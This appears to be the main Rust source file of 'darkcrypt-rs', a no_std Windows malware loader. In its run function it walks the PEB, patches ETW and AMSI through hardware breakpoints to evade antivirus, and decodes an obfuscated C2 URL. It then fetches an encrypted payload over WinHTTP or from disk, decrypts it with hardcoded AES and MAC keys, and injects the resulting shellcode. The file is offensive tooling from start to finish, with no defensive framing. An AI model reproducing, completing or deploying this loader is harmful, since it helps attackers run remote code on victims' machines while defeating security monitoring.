// darkcrypt-rs — no_std + no_main port.
//
// Zero Rust std linkage. Alloc crate is pulled in for Vec/String/BTreeMap,
// backed by a HeapAlloc-based #[global_allocator]. All stdout is removed;
// the loader signals state via ExitProcess codes.
//
//   0           PASS
//   1           peb::init failed
//   2           halos::init failed
//   3           hwbp_etw::etw_patch failed
//   4           hwbp_etw::amsi_patch failed
//   5           in-process syscall smoke failed (NtAllocate/NtFree round-trip)
//   6           payload read failed (CreateFileA/ReadFile/GetFileSizeEx)
//   7           decrypt failed (DCP1 verify/unwrap)
//   8           inject failed
//   9           http fetch failed (WinHTTP session/connect/request/read)
//   0xDEADBEEF  Rust panic reached the handler

#![no_std]
#![no_main]
#![allow(clippy::missing_safety_doc)]

extern crate alloc;

mod alloc_impl;
mod c_shims;
mod crypto;
mod encoded_strings;
mod halos;
mod hashes;
mod http;
mod hwbp_etw;
mod inject;
mod io;
mod native;
mod obfuscation;
mod panic_impl;
mod peb;
mod remote_hwbp;
mod sync;
mod syscalls;

use core::ptr;

use alloc::vec::Vec;

use native::ExitProcess;

const AES_KEY: [u8; 32] = [
    0xcb, 0x19, 0x87, 0x00, 0x72, 0x3b, 0x87, 0x8b,
    0xf5, 0xde, 0x3a, 0xd9, 0xab, 0xe9, 0x29, 0xd3,
    0xbb, 0x04, 0xf4, 0xc0, 0xbd, 0x74, 0x6a, 0xcc,
    0xcb, 0xf5, 0x5c, 0xb9, 0x0b, 0x89, 0xb4, 0xe2,
];

const MAC_KEY: [u8; 32] = [
    0x06, 0x77, 0x0d, 0xd3, 0xc1, 0x88, 0x3b, 0xda,
    0xfe, 0x74, 0x20, 0x88, 0x7a, 0x0c, 0xd3, 0x61,
    0x83, 0x3a, 0xe2, 0x79, 0x4e, 0x4e, 0x47, 0x96,
    0x25, 0xfc, 0xe1, 0x4a, 0xe5, 0x28, 0xe0, 0x14,
];

#[no_mangle]
pub unsafe extern "C" fn mainCRTStartup() -> ! {
    let code = run();
    ExitProcess(code);
}

#[inline(never)]
unsafe fn run() -> u32 {
    // ---- bootstrap: PEB walk + DJB2 cache + Halos trampoline ----
    if peb::init().is_err()   { return 1; }
    if halos::init().is_err() { return 2; }

    // ---- loader-side HWBP ----
    if hwbp_etw::etw_patch().is_err()  { return 3; }
    if hwbp_etw::amsi_patch().is_err() { return 4; }
    // AMSI EICAR self-test — informational, non-fatal (fails cleanly on hosts
    // without Defender). Not surfaced through the exit code.
    let _ = hwbp_etw::amsi_selftest();

    // ---- regression check — alloc + free through the trampoline ----
    let mut base: native::PVOID = ptr::null_mut();
    let mut size: usize = 0x1000;
    let st = syscalls::vm_alloc(
        native::CURRENT_PROCESS, &mut base, 0, &mut size,
        native::MEM_COMMIT | native::MEM_RESERVE,
        native::PAGE_READWRITE,
    );
    if !native::nt_success(st) || base.is_null() { return 5; }
    let mut fz: usize = 0;
    let _ = syscalls::vm_free(native::CURRENT_PROCESS, &mut base, &mut fz, native::MEM_RELEASE);

    // ---- payload source: no argv[1] -> fetch C2_URL; else disk path ----
    let arg1 = io::argv_one();
    let blob: Vec<u8> = if arg1.is_null() {
        let url_buf = obfuscation::xor_dec_mb(
            &encoded_strings::ENC_C2_URL,
            &encoded_strings::KEY_C2_URL,
        );
        // xor_dec_mb appends a trailing NUL; strip it for the HTTP slice.
        let url_slice = &url_buf[..url_buf.len() - 1];
        let r = http::fetch(url_slice);
        drop(url_buf);
        match r {
            Ok(b) => b,
            Err(_) => return 9,
        }
    } else {
        match io::read_file(arg1) {
            Ok(b) => b,
            Err(_) => return 6,
        }
    };
    let shellcode = match crypto::verify_and_decrypt_dcp1(&blob, &AES_KEY, &MAC_KEY) {
        Ok(pt) => pt,
        Err(_) => return 7,
    };

    if inject::inject_shellcode(&shellcode).is_err() { return 8; }
    0
}
